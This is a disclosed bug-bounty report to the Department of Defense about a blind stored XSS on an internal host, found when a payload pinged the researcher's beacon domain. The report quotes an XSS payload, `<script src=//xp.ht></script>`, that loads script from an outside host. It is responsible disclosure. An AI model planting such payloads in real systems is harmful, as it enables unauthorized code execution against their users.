# Blind Stored XSS on the internal host - █████████████

## Report Details
- **Report ID**: 923912
- **URL**: https://hackerone.com/reports/923912
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-07-14T23:16:35.723Z
- **Disclosed**: 2024-08-16T16:05:39.514Z

## Reporter
- **Username**: sp1d3rs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
##Description
Hello. I often use mine `xp.ht` host as a beacon for SSRF/XSS payloads, and today one was triggered from the `https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&&` endpoint (it was found in the Referer header)

This domain isn't resolvable from outside, so I assume the request came from host in the internal network, connected to extranet.

##POC
███████
Sadly, I'm not sure where is exactly the entry point was for the payload - only the vulnerable URL where it triggered the pingback to my host.
The `GET /?_=1594756841631` indicated that payload is likely reside in HTML source, and was triggered during student lookup (perhaps there is payload  somewhere in the student data containing `<script src=//xp.ht></script>` or similar).
You may need to confirm this with system owner first since I don't have enough details to confirm it from my side since vulnerable host is internal.

## Impact

Blind Stored XSS on the internal host.

## Attachments
No attachments
